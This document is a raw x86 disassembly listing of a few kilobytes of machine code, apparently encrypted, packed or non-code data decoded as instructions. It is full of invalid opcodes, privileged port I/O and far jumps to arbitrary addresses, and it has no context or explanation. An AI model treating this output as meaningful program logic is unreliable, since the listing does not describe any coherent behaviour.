  410063:	popf   
  410064:	aas    
  410065:	add    al,dh
  410067:	cmp    BYTE PTR [edi+0x69507fd7],ch
  41006d:	inc    BYTE PTR ds:0x2d195a58
  410073:	mov    eax,ds:0x9f758869
  410078:	jno    0x410078
  41007a:	lds    eax,FWORD PTR [bp+di]
  41007d:	push   0xffc5173e
  410082:	push   esi
  410083:	mov    edx,0x784ff64a
  410088:	imul   esi,DWORD PTR [eax+edi*8-0x79],0x4369
	...
  4100a0:	aas    
  4100a1:	mov    BYTE PTR [ebx-0x7c],bh
  4100a4:	inc    esp
  4100a5:	fsubr  DWORD PTR [ecx-0x2]
  4100a8:	call   0x42e:0xb8f2da6f
  4100af:	jmp    DWORD PTR [ebp-0x39]
  4100b2:	jno    0x4100b2
  4100b4:	pop    ss
  4100b5:	shr    bh,0x7
  4100b8:	sbb    bl,dl
  4100ba:	mov    esi,0x7fe607fe
  4100bf:	out    0x7,eax
  4100c1:	enter  0x8c69,0x6d
  4100c5:	add    esi,DWORD PTR [edx-0x2]
  4100c8:	out    dx,eax
  4100c9:	jle    0x4100a5
  4100cb:	or     edi,DWORD PTR [ecx]
  4100cd:	scas   eax,DWORD PTR es:[edi]
  4100ce:	add    bh,bh
  4100d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100d1:	(bad)  
  4100d2:	jno    0x4100d2
  4100d4:	xlat   BYTE PTR ds:[ebx]
  4100d5:	add    eax,esi
  4100d7:	pop    es
  4100d8:	fdiv   DWORD PTR [edx]
  4100da:	mov    edi,0x7fe7c7fe
  4100df:	jecxz  0x4100a8
  4100e1:	or     DWORD PTR [edx+0x69],ebp
  4100e4:	lock jne 0x41010a
  4100e7:	dec    ecx
  4100e8:	xor    DWORD PTR [esi+0x69],ebp
  4100eb:	mov    ah,0xc8
  4100ed:	pop    ecx
  4100ee:	push   0x5c079ffe
  4100f3:	cld    
  4100f4:	(bad)  
  4100f5:	scas   al,BYTE PTR es:[edi]
  4100f6:	and    al,0x69
  4100f8:	mov    cs,WORD PTR [esi+0x607e646b]
  4100fe:	int    0x77
  410100:	je     0x410139
  410102:	mov    ebp,0x69
	...
  410113:	add    BYTE PTR [eax],al
  410115:	add    BYTE PTR [esi-0x49],dh
  410118:	push   eax
  410119:	sub    edi,DWORD PTR [ecx-0x6397173b]
  41011f:	aas    
  410120:	mov    ch,0x69
  410122:	pop    esi
  410123:	pusha  
  410124:	sbb    edi,esp
  410126:	dec    edi
  410127:	mov    fs,WORD PTR [ecx+ebp*2]
  41012a:	dec    esi
  41012b:	mov    gs,WORD PTR [ebx+0x50]
  41012e:	ds pusha 
  410130:	lea    eax,[ebp+0x697d577c]
  410136:	ss pop es
  410138:	cmc    
  410139:	fdiv   QWORD PTR [edx-0x5e]
  41013c:	test   BYTE PTR [ecx+0x26],dh
  41013f:	pusha  
  410140:	call   0xa3c49334
  410145:	pop    esp
  410146:	push   ds
  410147:	pusha  
  410148:	pop    ebp
  410149:	add    al,0x84
  41014b:	mov    ebp,0x6ff003c0
  410150:	mov    gs,WORD PTR [ecx-0x7c]
  410153:	not    BYTE PTR [eax+0x38]
  410156:	mov    ah,0x5f
  410158:	cmp    eax,0x3d56a469
  41015d:	imul   esp,esi,0xc813b35f
  410163:	es out 0x68,eax
  410166:	(bad)  
  410167:	pop    edi
  410168:	push   ebx
  410169:	pop    eax
  41016a:	(bad)  
  41016b:	pop    edi
  41016c:	adc    eax,0xf73c69
  410171:	push   ss
  410172:	(bad)  
  410173:	pop    edi
  410174:	add    eax,0xf56e7c69
  410179:	push   0x0
	...
  41018a:	add    BYTE PTR [eax],al
  41018c:	scas   al,BYTE PTR es:[edi]
  41018d:	pop    edi
  41018e:	(bad)  
  41018f:	jnp    0x410194
  410191:	outs   dx,DWORD PTR ds:[esi]
  410192:	add    ebp,DWORD PTR [edi-0x63019ef8]
  410198:	das    
  410199:	pop    ecx
  41019a:	(bad)  
  41019b:	ficomp WORD PTR [eax]
  41019d:	fwait
  41019e:	jecxz  0x41017e
  4101a0:	sbb    BYTE PTR [ecx-0x2],ah
  4101a3:	push   esp
  4101a4:	in     al,0x6e
  4101a6:	ret    
  4101a7:	add    al,0x9
  4101a9:	popa   
  4101aa:	(bad)  
  4101ab:	je     0x410180
  4101ad:	pop    eax
  4101ae:	(bad)  
  4101af:	mov    dh,0xd8
  4101b1:	fimul  DWORD PTR [edi]
  4101b3:	rcl    ebp,0x22
  4101b6:	jmp    DWORD PTR [esi-0x69305d94]
  4101bc:	fsub   DWORD PTR [eax-0x1]
  4101bf:	sbb    al,0x13
  4101c1:	out    dx,eax
  4101c2:	add    cl,ch
  4101c4:	cwde   
  4101c5:	mov    eax,ds:0x6ee3fcfe
  4101ca:	imul   edi,DWORD PTR [eax+ebx*4-0x3cc301a0],0x886efe58
  4101d5:	call   0xd4fe:0x60885ed3
  4101dc:	jecxz  0x41024c
  4101de:	mov    edx,DWORD PTR [ecx+ebx*4]
  4101e1:	pusha  
  4101e2:	(bad)  
  4101e3:	aam    0xe3
  4101e5:	pop    edi
  4101e6:	mov    ah,0x21
  4101e8:	and    BYTE PTR [eax-0x2],0x3e
  4101ec:	fiadd  WORD PTR [esi]
  4101ee:	call   0x4101f4
	...
  4101ff:	add    BYTE PTR [eax],al
  410201:	add    BYTE PTR [edx+0x5d],bl
  410204:	(bad)  
  410205:	mov    ?,WORD PTR cs:[esi]
  410208:	mul    BYTE PTR [esi]
  41020a:	dec    eax
  41020b:	data16 mov al,0xa9
  41020e:	pop    eax
  41020f:	pop    ebp
  410210:	(bad)  
  410211:	pop    esp
  410212:	inc    ebx
  410213:	push   ebp
  410214:	dec    BYTE PTR [esi]
  410216:	sbb    esp,DWORD PTR [edi+edi*1-0x2111200]
  41021d:	mov    ch,0xfd
  41021f:	(bad)  
  410220:	std    
  410221:	push   ecx
  410223:	mov    bh,BYTE PTR [esi]
  410225:	dec    DWORD PTR [esi-0x49174c1a]
  41022b:	out    0xfd,al
  41022d:	call   0x3e453b
  410232:	sahf   
  410233:	cwde   
  410234:	loop   0x41022d
  410236:	scas   al,BYTE PTR es:[edi]
  410237:	out    0xe6,al
  410239:	test   ecx,ecx
  41023b:	in     eax,0xfd
  41023d:	jmp    esp
  41023f:	loop   0x410236
  410241:	call   FWORD PTR [esi-0x71bf8745]
  410247:	out    0xfd,al
  410249:	mov    ch,0x95
  41024b:	out    dx,al
  41024c:	std    
  41024d:	jmp    DWORD PTR [ecx+0x36]
  410250:	call   FWORD PTR ds:[esi-0x1a]
  410254:	inc    ebx
  410255:	clc    
  410256:	jo     0x410249
  410258:	sti    
  410259:	jmp    FWORD PTR [esi-0x1a]
  41025c:	jae    0x41025a
  41025e:	sub    DWORD PTR [eax+edx*1-0x3ee4e700],0xc
	...
  410275:	add    BYTE PTR [eax],al
  410277:	add    BYTE PTR [ecx],cl
  410279:	aaa    
  41027a:	mov    esp,ebp
  41027c:	mov    al,dh
  41027e:	cli    
  41027f:	push   0x19
  410281:	inc    eax
  410282:	dec    ebx
  410283:	jmp    DWORD PTR [edx+eiz*2]
  410286:	out    0x81,al
  410288:	in     al,dx
  410289:	in     eax,0xfd
  41028b:	mov    DWORD PTR [esi+eiz*8-0x3],eax
  41028f:	jne    0x410272
  410291:	inc    ecx
  410292:	test   eax,0xff099848
  410297:	xor    eax,0x40fa9c
  41029c:	add    DWORD PTR [esi-0x1a110005],eax
  4102a2:	jae    0x4102ac
  4102a4:	lock xchg DWORD PTR [ecx-0x258fceb9],ebx
  4102ab:	add    eax,esi
  4102ad:	outs   dx,DWORD PTR ds:[esi]
  4102ae:	and    bh,0x7d
  4102b1:	pop    edx
  4102b2:	gs (bad) 
  4102b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102b5:	fisub  DWORD PTR [esi-0x2]
  4102b8:	and    eax,0xd5935a68
  4102bd:	fs gs enter 0x63b2,0x2
  4102c3:	push   ebp
  4102c4:	jnp    0x410309
  4102c6:	add    ebx,0x69cf157c
  4102cc:	lock mov ecx,0x57e5feb5
  4102d2:	pop    edx
  4102d3:	xor    eax,0x88659525
  4102d8:	mov    ch,0xab
  4102da:	jns    0x410310
	...
  4102ec:	add    BYTE PTR [eax],al
  4102ee:	outs   dx,BYTE PTR ds:[esi]
  4102ef:	aaa    
  4102f0:	ret    
  4102f1:	(bad)  
  4102f2:	jp     0x41032e
  4102f4:	js     0x41031d
  4102f6:	mov    cl,0x6f
  4102f8:	cmp    BYTE PTR [esi],0xf0
  4102fb:	repz shl BYTE PTR [edi-0x52],0x16
  410300:	vshufps ymm6,ymm0,YMMWORD PTR [edi-0x17],0x11
  410306:	lock outs dx,DWORD PTR ds:[esi]
  410308:	stc    
  410309:	mov    edi,0xe7cc4ca4
  41030e:	jbe    0x4102a6
  410310:	gs (bad) 
  410312:	mov    al,ds:0x17000237
  410317:	jne    0x4102f3
  410319:	dec    esi
  41031a:	test   eax,0xf75002ae
  41031f:	cdq    
  410320:	cli    
  410321:	out    0x80,eax
  410323:	inc    edx
  410324:	gs (bad) 
  410326:	fcom   st(2)
  410328:	and    eax,0x3c9dfff
  41032d:	inc    esi
  41032e:	jo     0x410337
  410330:	out    0x3,eax
  410332:	inc    ebp
  410333:	popa   
  410334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410335:	add    al,BYTE PTR [bx+0x4f]
  410339:	mov    si,0xd5c
  41033d:	jno    0x4102c4
  41033f:	pop    ds
  410340:	out    dx,al
  410341:	lock push 0x5c
  410344:	jae    0x4103ad
  410346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410347:	shl    al,cl
  410349:	pop    ebx
  41034a:	pop    es
  41034b:	sbb    ch,dh
  41034d:	gs ss mov ebp,0x42af
	...
  410364:	repz push es
  410366:	xor    al,0x79
  410368:	fwait
  410369:	mov    BYTE PTR [eax+ebp*2-0x4abcf8f7],ch
  410370:	jbe    0x410344
  410372:	lock pop ebx
  410374:	test   eax,0x7865be1b
  410379:	ret    0xdab4
  41037c:	pop    edi
  41037d:	in     al,0x2c
  41037f:	mov    ebx,0xc81106b0
  410384:	mov    eax,0xfc64e8c5
  410389:	jmp    0x6480c64d
  41038e:	push   0xf15c36c2
  410393:	inc    ebx
  410394:	mov    ds:0x27dc18fd,eax
  410399:	pop    esp
  41039a:	test   DWORD PTR [esi-0x3ce07669],esp
  4103a0:	pop    ss
  4103a1:	int3   
  4103a2:	gs out dx,eax
  4103a4:	imul   DWORD PTR [esi-0x3]
  4103a7:	fild   WORD PTR [esi]
  4103a9:	pop    esp
  4103aa:	inc    eax
  4103ab:	mov    ecx,0xdc4d5bbe
  4103b0:	neg    DWORD PTR [ebx+0x55]
  4103b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103b4:	push   edi
  4103b5:	mov    ch,BYTE PTR [edi-0x1c183e]
  4103bb:	ins    BYTE PTR es:[edi],dx
  4103bc:	fwait
  4103bd:	(bad)  
  4103be:	jmp    FWORD PTR ds:0xb7e803c7
  4103c4:	scas   eax,DWORD PTR es:[edi]
  4103c5:	pop    esp
  4103c6:	(bad)  
  4103c7:	push   ds
	...
  4103d8:	add    BYTE PTR [eax],al
  4103da:	xlat   BYTE PTR ds:[ebx]
  4103db:	pop    edi
  4103dc:	(bad)  
  4103dd:	pushf  
  4103de:	mov    ebx,0x4ccda663
  4103e3:	pop    ebp
  4103e4:	enter  0xf02b,0x6
  4103e8:	push   ebp
  4103e9:	jb     0x410433
  4103eb:	mov    ebx,eax
  4103ed:	cmc    
  4103ee:	lods   eax,DWORD PTR ds:[esi]
  4103ef:	mov    ah,0x69
  4103f1:	jmp    0x5d3fcfaf
  4103f6:	mov    WORD PTR [ebx+0x48],fs
  4103f9:	sbb    eax,0x2c885d0d
  4103fe:	or     BYTE PTR [ecx-0x3a2498cc],dl
  410404:	push   DWORD PTR [ecx+0x16]
  410407:	xchg   ecx,eax
  410408:	daa    
  410409:	sub    ah,ch
  41040b:	xchg   BYTE PTR [esi],bh
  41040d:	jmp    0x4da8c661
  410412:	call   0x1089:0xac3dffc6
  410419:	jmp    0x1e011411
  41041e:	cmc    
  41041f:	mov    ah,0xe7
  410421:	pop    eax
  410422:	jnp    0x410480
  410424:	(bad)  
  410425:	sbb    DWORD PTR [ebx+ebx*2-0x2],ecx
  410429:	mov    cs,WORD PTR [ebp-0x1d]
  41042c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41042d:	and    BYTE PTR [ebx],dh
  41042f:	pop    ebx
  410430:	dec    esi
  410431:	outs   dx,BYTE PTR ds:[esi]
  410432:	push   es
  410433:	add    ebp,eax
  410435:	mov    dl,BYTE PTR [eax]
  410437:	pop    esp
  410438:	(bad)  
  410439:	push   ecx
  41043a:	mov    esp,0x56ff19
	...
  41044f:	add    BYTE PTR [eax-0x3296b9fa],bl
  410455:	push   es
  410456:	jne    0x410458
  410458:	xor    ebx,DWORD PTR [edx+edi*8-0x252e6cd]
  41045f:	jmp    DWORD PTR [esi]
  410461:	jecxz  0x410453
  410463:	scas   al,BYTE PTR es:[edi]
  410464:	loope  0x4104c1
  410466:	jae    0x410423
  410468:	push   ss
  410469:	imul   edi,edx,0xe65e5cff
  41046f:	sub    esp,DWORD PTR [ebp-0x78a0021d]
  410475:	sbb    eax,0x499904c1
  41047a:	mov    esp,ebp
  41047c:	sbb    bl,BYTE PTR [edx]
  41047e:	sti    
  41047f:	push   esi
  410480:	jle    0x4104c2
  410482:	(bad)  
  410483:	imul   edi,DWORD PTR [eax-0x1d],0xcaa10873
  41048a:	cmp    edi,edi
  41048c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41048d:	mov    WORD PTR [ebx-0x4],es
  410490:	adc    al,BYTE PTR [eax]
  410492:	xchg   BYTE PTR [eax],ch
  410494:	enter  0x8b02,0x3d
  410498:	jecxz  0x4104c4
  41049a:	inc    ecx
  41049b:	add    cl,bl
  41049d:	and    eax,0x6b0c7400
  4104a2:	mov    al,0x49
  4104a4:	or     BYTE PTR [ebx],al
  4104a6:	push   edi
  4104a7:	call   0x3f57f5
  4104ac:	inc    edx
  4104ad:	(bad)  
  4104ae:	jb     0x4104cf
  4104b0:	(bad)  
  4104b1:	jmp    0x0:0x4831
	...
  4104c4:	add    BYTE PTR [eax],al
  4104c6:	data16 out 0x4e,al
  4104c9:	push   0xbeef0619
  4104ce:	add    edi,ecx
  4104d0:	inc    edi
  4104d1:	inc    ecx
  4104d2:	or     DWORD PTR [esi-0x11ee8a03],edx
  4104d8:	and    esp,DWORD PTR [ebx-0x6a]
  4104db:	in     eax,0xe6
  4104dd:	push   ecx
  4104de:	out    0xe5,eax
  4104e0:	std    
  4104e1:	jmp    0x4104d3
  4104e3:	outs   dx,BYTE PTR ds:[esi]
  4104e4:	enter  0xb67f,0x6f
  4104e8:	xlat   BYTE PTR ds:[ebx]
  4104e9:	stc    
  4104ea:	les    edx,FWORD PTR ss:[esi]
  4104ed:	shr    BYTE PTR [ecx-0x20019ce8],0x1d
  4104f4:	mov    dl,0x37
  4104f6:	out    dx,eax
  4104f7:	xchg   edx,eax
  4104f8:	popf   
  4104f9:	inc    BYTE PTR [ebp+0x24]
  4104fc:	arpl   WORD PTR [eax+edi*8-0x9],si
  410500:	mov    al,0x3a
  410502:	mov    edi,0xa95dc2f0
  410507:	sub    eax,0xd5450008
  41050c:	outs   dx,DWORD PTR ds:[esi]
  41050d:	sub    BYTE PTR [ebx+ebx*2+0x7e09ffec],0x61
  410515:	je     0x4104ff
  410517:	pop    es
  410518:	sar    DWORD PTR [edx],cl
  41051a:	(bad)  
  41051b:	pusha  
  41051c:	mov    eax,DWORD PTR [esp+eax*4-0x49]
  410520:	push   edx
  410521:	dec    eax
  410522:	xor    DWORD PTR [eax+0x61],esi
  410525:	je     0x41050f
  410527:	inc    edi
  410528:	rcr    bh,1
	...
  41053a:	add    BYTE PTR [eax],al
  41053c:	outs   dx,DWORD PTR ds:[esi]
  41053d:	inc    eax
  41053e:	popa   
  41053f:	je     0x4105a5
  410541:	cwde   
  410542:	xlat   BYTE PTR ds:[ebx]
  410543:	pop    es
  410544:	dec    eax
  410545:	adc    eax,0xa657ff1f
  41054a:	inc    esp
  41054b:	add    esi,eax
  41054d:	sbb    cl,BYTE PTR [edi+0x5ea373eb]
  410553:	push   esi
  410554:	enter  0x3ca6,0x3f
  410558:	lock ja 0x41052f
  41055b:	add    BYTE PTR [ebx],dh
  41055d:	or     BYTE PTR [ecx+0x44],0x24
  410561:	outs   dx,DWORD PTR ds:[esi]
  410562:	add    al,BYTE PTR [eax]
  410564:	lock adc BYTE PTR [edx+0x48],ch
  410568:	mov    cl,0x6f
  41056a:	popa   
  41056b:	je     0x410565
  41056d:	push   es
  41056e:	jbe    0x410578
  410570:	retf   
  410571:	int    0xa7
  410573:	add    edx,DWORD PTR [edi+eiz*4+0x6f00418]
  41057a:	imul   ebx,ebx,0xbbd06f1
  410580:	out    0xd2,eax
  410582:	lock imul ecx,DWORD PTR [edx],0x12
  410586:	ss (bad) 
  410588:	enter  0xe89f,0x3
  41058c:	lock outs dx,BYTE PTR ds:[esi]
  41058e:	(bad)  
  41058f:	retf   0x58c6
  410592:	sbb    eax,0x66ef7d8
  410597:	sbb    al,0xb7
  410599:	pop    eax
  41059a:	dec    ecx
  41059b:	sbb    bh,BYTE PTR [ebx]
  41059d:	(bad)  
  41059e:	call   0x41068a
	...
  4105af:	add    BYTE PTR [eax],al
  4105b1:	add    BYTE PTR [esi-0xffc16ee],ah
  4105b7:	push   es
  4105b8:	bound  eax,QWORD PTR [edi+0x13]
  4105bb:	pop    eax
  4105bc:	mov    bl,0x3
  4105be:	lock push es
  4105c0:	jmp    0x84303d7b
  4105c5:	cmp    eax,0xc24106bf
  4105ca:	call   0xb8d:0xd3b3e8c7
  4105d1:	add    al,0xf0
  4105d3:	push   es
  4105d4:	jmp    0xb64fea39
  4105d9:	stc    
  4105da:	jo     0x4105f4
  4105dc:	add    al,ah
  4105de:	sysret 
  4105e0:	sbb    eax,0xf85f7301
  4105e5:	xlat   BYTE PTR ds:[ebx]
  4105e6:	call   0xf0a1312a
  4105eb:	push   es
  4105ec:	jmp    0x863720f4
  4105f1:	pop    ss
  4105f2:	(bad)  
  4105f4:	daa    
  4105f5:	add    al,0x1f
  4105f7:	adc    al,BYTE PTR [eax]
  4105f9:	mov    dl,0x24
  4105fb:	(bad)  
  4105fc:	inc    DWORD PTR [eax+0x66ff114d]
  410602:	ins    DWORD PTR es:[edi],dx
  410603:	inc    esp
  410604:	pop    ss
  410605:	push   edx
  410606:	sub    DWORD PTR [ebx-0x4c9aba76],esi
  41060c:	or     esp,DWORD PTR [edx-0x49]
  41060f:	pop    es
  410610:	(bad)  
  410611:	mov    ebx,0x817f87fb
	...
  410626:	add    BYTE PTR [eax],al
  410628:	hlt    
  410629:	push   es
  41062a:	add    BYTE PTR [esi],dh
  41062c:	mov    esi,0x38698f0b
  410631:	pop    eax
  410632:	(bad)  
  410633:	jmp    0x6e50dc88
  410638:	je     0x4105cd
  41063a:	(bad)  
  41063b:	call   0xd27d8a33
  410640:	mov    esp,0xbfe8ffc6
  410645:	idiv   dh
  410647:	mov    ah,0xf8
  410649:	retf   
  41064a:	inc    eax
  41064b:	jmp    0xa27c1960
  410650:	mov    dl,0x57
  410652:	out    0x1,al
  410654:	jmp    0xf3e304b0
  410659:	push   es
  41065a:	add    cl,ch
  41065c:	ss inc ebp
  41065e:	and    ebp,ecx
  410660:	push   edi
  410661:	mov    BYTE PTR [ecx+ebp*8],al
  410664:	repz push es
  410666:	add    BYTE PTR [edx-0x58],ch
  410669:	add    eax,DWORD PTR [ebx-0x7af80c0a]
  41066f:	out    dx,al
  410670:	rcr    BYTE PTR [eax-0x2],1
  410673:	jb     0x4106a3
  410675:	pop    ebx
  410676:	pop    esi
  410677:	mov    al,0xb5
  410679:	add    eax,DWORD PTR [eax]
  41067b:	aas    
  41067c:	inc    esp
  41067d:	dec    esp
  41067e:	fisubr DWORD PTR [ecx]
  410680:	hlt    
  410681:	pop    esi
  410682:	jno    0x410684
  410684:	sbb    dl,al
  410686:	std    
  410687:	mov    esp,DWORD PTR [eax+0x2a]
  41068a:	test   BYTE PTR [ebx+0x0],0x0
	...
  41069d:	add    BYTE PTR [eax+0x6b],dl
  4106a0:	jle    0x41064a
  4106a2:	sub    eax,DWORD PTR [ebx+ecx*4]
  4106a5:	leave  
  4106a6:	das    
  4106a7:	mov    al,bh
  4106a9:	jmp    0x41069c
  4106ab:	mov    edi,eax
  4106ad:	add    eax,edi
  4106af:	mov    al,bh
  4106b1:	push   eax
  4106b2:	push   edx
  4106b3:	shl    esi,0xa7
  4106b6:	fisttp WORD PTR [edx]
  4106b8:	add    BYTE PTR [ebx-0x36766de0],cl
  4106be:	retf   0x89cc
  4106c1:	leave  
  4106c2:	outs   dx,DWORD PTR ds:[esi]
  4106c3:	add    esi,esi
  4106c5:	jne    0x4106bc
  4106c7:	inc    edi
  4106c8:	rcl    DWORD PTR [ebp+0x42],0xe6
  4106cc:	data16 or ch,bh
  4106cf:	dec    ecx
  4106d0:	(bad)  
  4106d1:	test   DWORD PTR [ebx+0x22ffc309],0xc90b064d
  4106db:	cmp    eax,0xe884eb0a
  4106e0:	push   es
  4106e1:	(bad)  
  4106e2:	xchg   ecx,eax
  4106e3:	dec    edx
  4106e4:	jle    0x41071e
  4106e6:	cdq    
  4106e7:	das    
  4106e8:	hlt    
  4106e9:	leave  
  4106ea:	dec    ebx
  4106eb:	(bad)  
  4106ec:	call   DWORD PTR [edx+edx*1-0x29]
  4106f0:	add    esp,0x30669a45
  4106f6:	lea    ecx,[ebx-0x2]
  4106f9:	neg    DWORD PTR [ebx]
  4106fb:	or     al,0xc3
  4106fd:	inc    DWORD PTR [esi+0xf240]
	...
  410713:	add    BYTE PTR [ecx+0xa],bl
  410716:	add    BYTE PTR [ebx],ch
  410718:	xor    bh,BYTE PTR [eax+0x43]
  41071b:	cld    
  41071c:	stc    
  41071d:	mov    ch,0x73
  41071f:	or     al,dh
  410721:	xchg   DWORD PTR [eax+0xd],edi
  410724:	lock pop edi
  410726:	xchg   DWORD PTR [edi+0x745d92a8],edi
  41072c:	call   0x17752fa8
  410731:	fisttp QWORD PTR [esp+eax*2-0x184bdff8]
  410738:	xchg   esp,eax
  410739:	sub    ebx,DWORD PTR [edi-0x2]
  41073c:	imul   ebp,DWORD PTR [ebx-0x448201aa],0x5ffd536b
  410746:	add    cl,BYTE PTR [ebx]
  410748:	mov    al,0x93
  41074a:	idiv   dh
  41074c:	gs enter 0x745e,0xdc
  410751:	outs   dx,DWORD PTR ds:[esi]
  410752:	push   0xffffff87
  410754:	or     al,0x25
  410756:	pop    edi
  410757:	(bad)  
  410758:	cmp    eax,0xed416c2c
  41075d:	pop    edi
  41075e:	add    bh,bh
  410760:	cmp    eax,0xe5f36a68
  410765:	add    al,0x5f
  410767:	and    BYTE PTR ds:0xfe740254,0x77
  41076e:	mov    cl,0x4a
  410770:	xor    DWORD PTR [eax+0x5d],esp
  410773:	je     0x4106f9
  410775:	pop    es
  410776:	xchg   ebx,eax
  410777:	or     eax,0x0
	...
  410788:	add    BYTE PTR [eax],al
  41078a:	lock pop edi
  41078c:	or     eax,eax
  41078e:	add    al,0x6b
  410790:	cdq    
  410791:	add    al,dh
  410793:	pop    edi
  410794:	add    bh,bh
  410796:	in     eax,0x3b
  410798:	push   0x5
  41079a:	and    al,0x4d
  41079c:	pop    ebp
  41079d:	mov    dh,BYTE PTR [ebx]
  41079f:	sub    BYTE PTR [ebp-0x3f],cl
  4107a2:	in     al,dx
  4107a3:	pop    edi
  4107a4:	mov    bh,0x8a
  4107a6:	pop    esp
  4107a7:	(bad)  
  4107a8:	popf   
  4107a9:	(bad)  [eax-0x3ea416fa]
  4107af:	pop    es
  4107b0:	stos   BYTE PTR es:[edi],al
  4107b1:	pop    esi
  4107b2:	ss fneni(8087 only) 
  4107b5:	imul   ebx,esp,0x1c
  4107b8:	mov    ds,WORD PTR [esi-0x67]
  4107bb:	(bad)  
  4107bc:	adc    BYTE PTR [ecx+0x5ee8c7d7],bh
  4107c2:	pushf  
  4107c3:	inc    BYTE PTR [eax+0x6d55c7dc]
  4107c9:	jmp    0x2c1fe6bd
  4107ce:	mov    cl,0x6
  4107d0:	pop    esi
  4107d1:	fsubr  st,st(7)
  4107d3:	pop    esi
  4107d4:	ret    0xef1b
  4107d7:	push   esp
  4107d8:	dec    ebp
  4107d9:	fsubr  st,st(7)
  4107db:	pop    esi
  4107dc:	xor    al,0x60
  4107de:	ficom  WORD PTR [eax+eax*4+0x4]
  4107e2:	lock push es
  4107e4:	jmp    0xe94cb935
  4107e9:	mov    eax,0x4769637a
	...
  4107fe:	add    BYTE PTR [eax],al
  410800:	(bad)  
  410801:	(bad)  
  410803:	inc    eax
  410804:	test   DWORD PTR [esi],0x47f0d111
  41080a:	or     eax,0x6031c5e
  41080f:	fdiv   st,st(7)
  410811:	pop    esi
  410812:	js     0x41082d
  410814:	xchg   edi,eax
  410815:	push   esp
  410816:	sub    eax,0xe9068bc8
  41081b:	add    esi,eax
  41081d:	sub    DWORD PTR [ebx],0x25df2f5c
  410823:	leave  
  410824:	xor    BYTE PTR [edi],al
  410826:	ror    DWORD PTR [edx-0x49],0x53
  41082a:	int    0x9
  41082c:	xor    bl,bl
  41082e:	or     dh,BYTE PTR [edx+esi*2-0x230b3f2e]
  410835:	cld    
  410836:	inc    DWORD PTR [edx+0x44]
  410839:	(bad)  
  41083a:	(bad)  
  41083b:	xor    al,0xe0
  41083d:	pop    esi
  41083e:	fnclex 
  410840:	pushf  
  410841:	push   esp
  410842:	or     ch,BYTE PTR [ecx+0x2cc70d18]
  410848:	nop
  410849:	push   ebx
  41084a:	(bad)  
  41084b:	jmp    0xc2a56743
  410850:	mov    esp,0x90248a54
  410855:	ds shl ecx,0xf3
  410859:	mov    ecx,0xec417d8a
  41085e:	pop    edi
  41085f:	inc    esp
  410860:	xor    al,0x54
  410862:	neg    bl
	...
  410874:	add    BYTE PTR [eax],al
  410876:	repnz inc edi
  410878:	inc    BYTE PTR [edx]
  41087a:	sub    DWORD PTR [ebp+0x74],edx
  41087d:	loope  0x4108da
  41087f:	int    0xfe
  410881:	inc    esi
  410882:	cmp    eax,0x6feec001
  410887:	jns    0x410888
  410889:	call   0xe1b55c81
  41088e:	pop    ebx
  41088f:	push   eax
  410890:	xor    DWORD PTR [esi],esp
  410892:	sbb    eax,0xee94c001
  410897:	pop    ebp
  410898:	mov    ecx,ebp
  41089a:	repz push es
  41089c:	call   DWORD PTR [edi+esi*8+0xbf17453]
  4108a3:	in     eax,dx
  4108a4:	(bad)  
  4108a5:	(bad)  
  4108a6:	xor    al,0x55
  4108a8:	je     0x41088b
  4108aa:	sbb    ebx,DWORD PTR ds:0x124ee3a
  4108b0:	rcr    BYTE PTR [edx+esi*8+0x5f],0x70
  4108b5:	ficomp WORD PTR [esi+0xba0e80b]
  4108bb:	push   esp
  4108bc:	(bad)  
  4108bd:	loop   0x410872
  4108bf:	fiadd  DWORD PTR [ecx]
  4108c1:	add    BYTE PTR [edx+0x66],al
  4108c4:	std    
  4108c5:	jne    0x410928
  4108c7:	fistp  WORD PTR [edi]
  4108c9:	cmp    DWORD PTR [esi-0x33ff64e],eax
  4108cf:	or     bl,ch
  4108d1:	push   ebp
  4108d2:	loope  0x410870
  4108d4:	and    eax,0x73b24941
  4108d9:	or     BYTE PTR [eax],al
	...
  4108eb:	add    BYTE PTR [ecx-0x73],dh
  4108ee:	cmp    bh,bh
  4108f0:	jbe    0x4108f0
  4108f2:	mov    edi,0x40de0b75
  4108f7:	call   FWORD PTR [edi+edi*8]
  4108fa:	out    0x9a,eax
  4108fc:	inc    ecx
  4108fd:	mov    dl,0xfd
  4108ff:	or     ebx,DWORD PTR [ecx+0x3c]
  410902:	add    bl,ch
  410904:	fnsave [ecx-0x4a5ef78d]
  41090a:	inc    DWORD PTR ss:[esi-0x1]
  41090e:	mov    edi,0x24dfdb75
  410913:	call   FWORD PTR [esi+edi*8-0x4c247819]
  41091a:	std    
  41091b:	add    DWORD PTR [ecx],0x26
  41091e:	ja     0x410922
  410920:	repnz retf 0xc009
  410924:	pop    ebp
  410925:	push   edi
  410926:	cmp    eax,DWORD PTR [eax]
  410928:	leave  
  410929:	push   esi
  41092a:	(bad)  
  41092b:	jb     0x4108c2
  41092d:	outs   dx,DWORD PTR ds:[esi]
  41092e:	(bad)  
  41092f:	call   FWORD PTR [ecx+0x3205eb06]
  410935:	pop    es
  410936:	add    BYTE PTR [eax],al
  410938:	mov    DWORD PTR [edi-0x3f],edi
  41093b:	pop    ebx
  41093c:	rol    bh,1
  41093e:	push   es
  41093f:	add    BYTE PTR [edi+edi*2-0x16],bl
  410943:	push   0x3f0ce8
  410948:	xchg   ecx,eax
  410949:	cmp    edi,edi
  41094b:	ret    0x38f0
  41094e:	pop    edx
  41094f:	je     0x410951
	...
  410961:	add    ah,dh
  410963:	inc    eax
  410964:	rol    BYTE PTR [edi],1
  410966:	dec    eax
  410967:	add    bl,BYTE PTR [ebx-0x2]
  41096a:	push   edi
  41096b:	push   ebp
  41096c:	inc    edx
  41096d:	je     0x410959
  41096f:	cwde   
  410970:	ror    BYTE PTR [ebx],1
  410972:	inc    edi
  410973:	sbb    ecx,DWORD PTR [eax+ebp*8]
  410976:	out    0xa8,eax
  410978:	pop    edx
  410979:	(bad)  
  41097a:	jmp    0x41091b
  41097c:	ror    BYTE PTR [edx],1
  41097e:	das    
  41097f:	repz pop es
  410981:	call   FWORD PTR [ebp+0x1f076a67]
  410987:	mov    DWORD PTR [edx-0x38],ebx
